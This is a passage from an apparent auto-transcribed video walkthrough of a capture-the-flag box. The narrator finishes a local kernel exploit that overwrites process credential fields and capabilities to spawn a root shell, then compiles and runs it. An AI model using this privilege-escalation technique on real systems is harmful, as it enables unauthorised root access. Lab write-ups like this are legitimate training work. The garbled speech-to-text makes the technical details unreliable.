14 and the loop ends so the only thing left to do is put some code to launch a shell and let's see if they have that in here if not we'll just create it they do and we also have to set capabilities so the capabilities that is this stuff so let's go here be exploit see and then we go back to where get root is thread I t plus equals 1 is gonna skip the 4 bytes and the 4 bytes is these secure bits so we just don't want to go and modify those so skip over those and then address thread I T equals 0 X 1 2 3 4 1 2 3 4 and this is 1 2 3 4 5 6 7 8 9 10 1 2 3 4 5 6 7 8 9 10 and then we can do is X CL and Sh okay that doing this in something that recognizes and Auto tabs things for you is so handy because when you make a typo it's very apparent okay GCC to make sure it compiles it does SCP copied GCC - Oh exploit exploit C and we're going to try this for the last well second the last time hopefully got route ID and we are route so if I do PWD we're in there we can do WCC route text to see 33 characters in a line break so let's go and do something hilarious and remove this thing so instead of this let's just puts D chaos so let's try this and then GCC - OH exploit exploit dot C so I look at my ID there UID 1000 I'm gonna run this and we got chaos everywhere we're also route but if we do ID here we are route here now so every process this deserty I don't know how to say this word but every process this guy had is now route because we just modify the credential structure of everything so yep that is the box sorry I'm not doing it the intended way but I feel like this video is long enough and maybe I'll do a one-off video doing it the intended way when I underst better to explain it take care everyone have a good day later